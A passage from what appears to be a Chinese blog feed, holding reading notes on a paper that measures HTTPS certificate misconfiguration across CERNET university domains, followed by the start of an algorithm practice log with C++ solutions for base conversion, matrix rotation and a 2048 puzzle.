<p>HTTPS现在几乎已经成了浏览器和网站的标配，但不正确的配置也会导致问题。本文针对中国211高校域名（CERNET）的HTTPS证书展开分析工作，调查了最近一系列关于
HTTPS
证书签发、部署和撤销的研究论文，总结过去五年现代证书管理的趋势；然后从五个角度：<strong>主题备用名称</strong>（subject
alternative name，
SAN）<strong>不匹配</strong>、<strong>有效期过长</strong>、<strong>证书链断裂</strong>、<strong>证书不透明</strong>和过时的加密算法，对CERNET的HTTPS部署展开正确性调查；此外，还调查了四个可用性因素：证书指示符、证书签发人、证书共享和证书吊销，分析它们和安全性的关系。作者共花费12周，每周统计一次数据，并进行分析。</p>
<p>在第二章中，作者介绍了近些年HTTPS证书管理的内容，这一块内容说的比较杂，先讲HTTPS的方案：SAN（SAN
的存在使得一个证书可以同时适用于多个域名，从而简化了证书管理的复杂性，它把证书分为了三类，单域名证书、通配符证书和多域名证书）、证书链。证书颁发机构（CA）的努力，如Let's
Encrypt免费自动签发域名<strong>验证证书（DV）</strong>，除了这个还有<strong>扩展验证
(EV)、个人验证 (IV) 和组织验证
(OV)证书</strong>。第三是从证书透明度和撤销机制入手，<strong>在线证书状态协议（OCSP）</strong>是最广泛使用的证书撤销机制，OCSP
stapling用于缓解延迟，OCSP Must-Staple会阻止没有通过OCSP
stapling的站点；<strong>证书透明度（CT）</strong>会将已签名的证书时间戳（SCT，代表提交时的承诺与最大合并延迟）嵌入证书中。最后是介绍证书分享，一方被破，全员遭罪，这将引入很大的安全风险。</p>
<p>接下来，作者开始介绍他们的工作，将从下面三个问题进行：</p>
<ol type="1">
<li>证书部署的总体趋势如何？</li>
<li>用户因素如何影响证书的部署？</li>
<li>有多少用户和哪些类型的网络服务会受到影响？</li>
</ol>
<p>在开展数据分析前，首先要做的工作是获取CERNET的各个域名和子域名，后者则是通过
<a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>自动生成子域名和
<a href="https://crt.sh/">ctr.sh</a>
CT搜索引擎来获取，得到了31,211个域名，19,493
(62.45%)个域名可访问，11,718 (35.54%)个域名存在访问问题。继续利用 <a href="https://requests.readthedocs.io/en/master/">Requests</a>来从HTTP和HTTPS访问这些域名以检查他们的可访问性，得到了如下图的统计结果：</p>
<p><img src="/images/%E8%AF%81%E4%B9%A6%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230821172040654.png" alt="image-20230821172040654" style="zoom:50%;"></p>
<p>接下来，为了分析是否存在五个方面的问题，作者获取每个域名的证书，以Chrome
Root Store、Apple OS , Mozilla, and Windows Root Certificate
Program中的98个根证书作为可信根证书列表，来分析得到的域名数据。具体来说，使用OpenSSL的报错信息来验证证书链，对其他四个问题，使用pyOpenSSL来解析证书，提取每个字段的信息和预设的标准进行比较。统计结果如下表所示：</p>
<p><img src="/images/%E8%AF%81%E4%B9%A6%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230821190516277.png" alt="image-20230821190516277" style="zoom:50%;"></p>
<ul>
<li><p><strong>SAN不匹配</strong>：域名如果不在证书的SAN字段则被认为符合这种情况，结果由下图总结。还有个有趣的事实是在1680个不匹配的域名中有1171（69.70%）个是多级域名，但通配符证书只能匹配一级。</p>
<p><img src="/images/%E8%AF%81%E4%B9%A6%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230821192244853.png" alt="image-20230821192244853" style="zoom:50%;"></p></li>
<li><p><strong>有效期过长</strong>：2020年1月1日以后的证书有效期不允许超过398天，如果在以前，则考虑不超过825天。结果由下图总结。作者同样考虑了有效期较短的问题——管理员会忘记更新证书，结果表明70%过期但仍被使用的证书有效期较短。</p>
<p><img src="/images/%E8%AF%81%E4%B9%A6%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230821192817522.png" alt="image-20230821192817522" style="zoom:50%;"></p></li>
<li><p><strong>证书链断裂</strong>：如果域名提供的证书不能将叶证书连接到根证书则视为符合这种情况。8%的域名没有安装中间证书，在第十周证书链断裂的数量从1042增长到了1211，98.16%的都是由于证书更新。我们发现
89.00%
存在此问题的域名只提供了叶证书。这表明出现此问题的主要原因是管理员不知道安装完整的证书链。剩下的
11.00%
域名提供了错误的中间证书。其中，大部分域名（90.23%）将叶子证书作为中间证书。9.77%
的域名提供了以前使用过的证书的中间证书，这表明管理员在更新后忘记更改证书链。</p></li>
<li><p><strong>证书不透明</strong>：2018年4月以后证书不提交SCT则视为符合这种情况。在指定日期后签发的1789个证书中，只有85个没有设置SCT字段，并且它们都是自签名证书。在指定日期以前有
199 个域名在未设置 SCT 的情况下安装了四个证书。</p></li>
<li><p><strong>过时的密码学算法</strong>：使用MD5、SHA1和RSA有效bit为1024的则视为符合这种情况。统计结果由下图总结：</p>
<p><img src="/images/%E8%AF%81%E4%B9%A6%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230821193954874.png" alt="image-20230821193954874" style="zoom:50%;"></p></li>
</ul>
<p>为了回答问题2，作者提出了四个可用性因素（？，Usability Factor）</p>
<ul>
<li><p><strong>证书指标类型</strong>：使用 <a href="https://chromium.googlesource.com/chromium/src/%20net/+/master/cert/ev_root_ca_metadata.cc">EV
policy Object Identifier (OID) set</a>
来筛选EV，其余用<em>Subject</em>字段区分，统计结果如下图所示。作者发现大多数证书（75.94%）都是
DV 证书，而大多数域名（65.48%）都疯狂地安装了 IV/OV 证书。 EV
证书的无效比例最高（83.70%），DV 证书的无效比例最低（24.99%）。在 IV/OV
证书中，我们发现 98.97% 的域名与他人共享证书，55.09%
的证书被错误部署。</p>
<p><img src="/images/%E8%AF%81%E4%B9%A6%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230821195207400.png" alt="image-20230821195207400" style="zoom:50%;"></p></li>
<li><p><strong>证书颁发者的选择</strong>：从证书 <em>Issuer Name</em>
字段的 <em>commonName</em> 中提取 CA 名称。</p>
<p><img src="/images/%E8%AF%81%E4%B9%A6%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230821200041544.png" alt="image-20230821200041544" style="zoom:50%;"></p></li>
<li><p><strong>多个域名共享证书</strong>：结果如下图所示。一个有趣的事实是80%无效部署的域名都是使用了付费CA</p>
<p><img src="/images/%E8%AF%81%E4%B9%A6%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230821200539018.png" alt="image-20230821200539018" style="zoom:50%;"></p></li>
<li><p><strong>证书申请者的撤销选择</strong>：作者发现有 1,750 份由可信
CA 签发的证书提供了 OCSP
信息。对于过期的证书，我们提取了签发者，以评估现代浏览器是否无法识别其根证书。作者发现没有证书在有效期内被吊销。过期证书被浏览器撤销了，并且过期了很长时间，这表明被动撤销对管理者来说是未知的。在安装了
1,750 份证书的 11,673 个域名中，作者发现只有 1,828
个域名（15.66%）在服务器端配置了 OCSP
装订，而且没有一个域名在证书中设置了 OCSP
Must-staple。（这个不知道怎么来的）</p></li>
</ul>
<p>最后回答问题3，统计使用广泛程度，列出了一些常用服务和使用人数，不清楚如何统计的人数。</p>
]]></content>
      <categories>
        <category>论文阅读笔记</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>https</tag>
        <tag>certificate</tag>
      </tags>
  </entry>
  <entry>
    <title>算法刷题记录</title>
    <url>/2023/06/08/2023/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>我是什么fw😢</p>
<span id="more"></span>
<p>[toc]</p>
<h1 id="入门">入门</h1>
<h2 id="进制">进制</h2>
<h3 id="十进制和二进制">十进制和二进制</h3>
<p>介绍：对于一个十进制数A，将A转换为二进制数，然后按位逆序排列，再转换为十进制数B，我们称B为A的二进制逆序数。
例如对于十进制数173，它的二进制形式为10101101，逆序排列得到10110101，其十进制数为181，181即为173的二进制逆序数。</p>
<p>重点就是大数的十进制和二进制互转。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">d2b</span><span class="params">(<span class="type">char</span> s[<span class="number">1000</span>])</span></span>&#123;</span><br><span class="line">    string result;</span><br><span class="line">    <span class="type">int</span> num[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)&#123;</span><br><span class="line">        num[i] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; len)&#123;</span><br><span class="line">        <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">        result += num[len<span class="number">-1</span>] % <span class="number">2</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++)&#123;</span><br><span class="line">            <span class="type">int</span> tmp = num[j];</span><br><span class="line">            num[j] = (num[j] + c) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(tmp % <span class="number">2</span> == <span class="number">1</span>) c = <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">else</span> c = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num[i] == <span class="number">0</span>) i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(result.<span class="built_in">begin</span>(), result.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">b2d</span><span class="params">(string sb)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> len = sb.<span class="built_in">size</span>();</span><br><span class="line">	<span class="type">int</span> upb = <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> res_d[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	string result;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; upb; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(j == <span class="number">0</span>)&#123;</span><br><span class="line">				res_d[j] = res_d[j] * <span class="number">2</span> + (sb[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				res_d[j] = res_d[j] * <span class="number">2</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; upb; k++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(res_d[k] &gt; <span class="number">9</span>)&#123;</span><br><span class="line">				res_d[k+<span class="number">1</span>]++;</span><br><span class="line">				res_d[k] %= <span class="number">10</span>;</span><br><span class="line">				<span class="keyword">if</span>(k == upb - <span class="number">1</span>)&#123;</span><br><span class="line">					upb ++ ;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = upb - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">		result += res_d[i] + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">        string sb = <span class="built_in">d2b</span>(s);</span><br><span class="line">        <span class="built_in">reverse</span>(sb.<span class="built_in">begin</span>(), sb.<span class="built_in">end</span>());</span><br><span class="line">        string res = <span class="built_in">b2d</span>(sb);</span><br><span class="line">        cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="进制转换m2n">进制转换M2N</h3>
<p>就是在M进制转十进制的时候把进位的10改成n（十进制转N进制其实没必要单独写了）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">m2n</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n, string num)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> len = num.<span class="built_in">size</span>();</span><br><span class="line">	<span class="type">int</span> upb = <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> res_d[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	string result;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; upb; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(j == <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>((num[i] - <span class="string">&#x27;0&#x27;</span>) &lt; <span class="number">10</span>)	res_d[j] = res_d[j] * m + (num[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">				<span class="keyword">else</span> res_d[j] = res_d[j] * m + (num[i] - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				res_d[j] = res_d[j] * m;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; upb; k++)&#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(res_d[k] &gt; n<span class="number">-1</span>)&#123;</span><br><span class="line">				res_d[k+<span class="number">1</span>] += res_d[k] / n;</span><br><span class="line">				res_d[k] %= n;</span><br><span class="line">				<span class="keyword">if</span>(k == upb - <span class="number">1</span>)&#123;</span><br><span class="line">					upb ++ ;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = upb - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n &gt; <span class="number">9</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(res_d[i] &gt; <span class="number">9</span>)&#123;</span><br><span class="line">				result += (res_d[i] - <span class="number">10</span> + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				result += res_d[i] + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			result += res_d[i] + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> m, n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; m &gt;&gt; n)&#123;</span><br><span class="line">		string m_num;</span><br><span class="line">		cin &gt;&gt; m_num;</span><br><span class="line">		string n_num = <span class="built_in">m2n</span>(m, n, m_num);</span><br><span class="line">		cout &lt;&lt; n_num &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="负二进制">负二进制</h3>
<p>注意C里面除以-2的余数有好几种情况，-1-0-1都有可能；</p>
<p>还有边界输入0考虑一下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> ip;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; ip)&#123;</span><br><span class="line">		string op;</span><br><span class="line">		<span class="keyword">if</span>(ip == <span class="number">0</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(ip!=<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="type">int</span> r = ip % <span class="number">-2</span>, k = ip / <span class="number">-2</span>;</span><br><span class="line">			<span class="keyword">if</span>(r == <span class="number">0</span>)&#123;</span><br><span class="line">				ip = k;</span><br><span class="line">				op += r + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(r == <span class="number">-1</span>)&#123;</span><br><span class="line">				ip = k+<span class="number">1</span>;</span><br><span class="line">				op += r+<span class="number">2</span>+<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(r == <span class="number">1</span>)&#123;</span><br><span class="line">				ip = k;</span><br><span class="line">				op += r + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">reverse</span>(op.<span class="built_in">begin</span>(), op.<span class="built_in">end</span>());</span><br><span class="line">		cout &lt;&lt; op &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="排序">排序</h2>
<h3 id="旋转矩阵">旋转矩阵</h3>
<p>函数调用二维数组和返回指针有点折磨，最后还是定义了全局变量</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> data[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> s[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">one</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">			data[i][j] = s[n-j<span class="number">-1</span>][i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">			s[i][j] = data[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">two</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">			data[i][j] = s[j][m<span class="number">-1</span>-i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">			s[i][j] = data[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">three</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">			data[i][j] = s[i][m-j<span class="number">-1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">			s[i][j] = data[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m, k;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m &gt;&gt; k)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">				cin &gt;&gt; s[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line">			<span class="type">int</span> k_;</span><br><span class="line">			cin &gt;&gt; k_;</span><br><span class="line">			<span class="keyword">if</span>(k_ == <span class="number">1</span>)&#123;</span><br><span class="line">				<span class="built_in">one</span>(n, m);</span><br><span class="line">				<span class="type">int</span> tmp = m;</span><br><span class="line">				m = n;</span><br><span class="line">				n = tmp;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(k_ == <span class="number">2</span>)&#123;</span><br><span class="line">				<span class="built_in">two</span>(n, m);</span><br><span class="line">				<span class="type">int</span> tmp = m;</span><br><span class="line">				m = n;</span><br><span class="line">				n = tmp;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(k_ == <span class="number">3</span>)&#123;</span><br><span class="line">				<span class="built_in">three</span>(n, m);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">				cout &lt;&lt; s[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>; </span><br><span class="line">			&#125; </span><br><span class="line">			cout &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="section">2048</h3>
<p>我是每次反着遍历，然后把找不为0的值，如果下一个不相等就存在一个数组里，如果找到相等的就*2再存。每次找到不等于0的值一定要存，在这里卡了很久。</p>
<p>看别人的答案是比较规矩的：先移到一侧，再合并，再移到一侧。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> data[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span> s[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">				cin &gt;&gt; s[i][j]; </span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">				<span class="type">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">					<span class="keyword">if</span>(s[j][i] != <span class="number">0</span>)&#123;</span><br><span class="line">						<span class="keyword">if</span>(j != <span class="number">3</span>)&#123;</span><br><span class="line">							<span class="type">int</span> jud = <span class="number">1</span>; </span><br><span class="line">							<span class="keyword">for</span>(<span class="type">int</span> k = j+<span class="number">1</span>; k &lt; <span class="number">4</span>; k++)&#123;</span><br><span class="line">								<span class="keyword">if</span>(s[k][i] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">								<span class="keyword">if</span>(s[k][i] == s[j][i])&#123;</span><br><span class="line">									tmp[idx++] = <span class="number">2</span> * s[j][i];</span><br><span class="line">									j = k;</span><br><span class="line">									jud = <span class="number">0</span>;</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span>&#123;</span><br><span class="line">									tmp[idx++] = s[j][i];</span><br><span class="line">									jud = <span class="number">0</span>;</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">if</span>(jud)&#123;</span><br><span class="line">								tmp[idx++] = s[j][i];</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span>&#123;</span><br><span class="line">							tmp[idx++] = s[j][i];</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">					s[j][i] = tmp[j];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">				<span class="type">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">					<span class="keyword">if</span>(s[j][i] != <span class="number">0</span>)&#123;</span><br><span class="line">						<span class="keyword">if</span>(j != <span class="number">0</span>)&#123;</span><br><span class="line">							<span class="type">int</span> jud = <span class="number">1</span>; </span><br><span class="line">							<span class="keyword">for</span>(<span class="type">int</span> k = j - <span class="number">1</span>; k &gt;= <span class="number">0</span>; k--)&#123;</span><br><span class="line">								<span class="keyword">if</span>(s[k][i] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">								<span class="keyword">if</span>(s[k][i] == s[j][i])&#123;</span><br><span class="line">									tmp[idx++] = <span class="number">2</span> * s[j][i];</span><br><span class="line">									j = k;</span><br><span class="line">									jud = <span 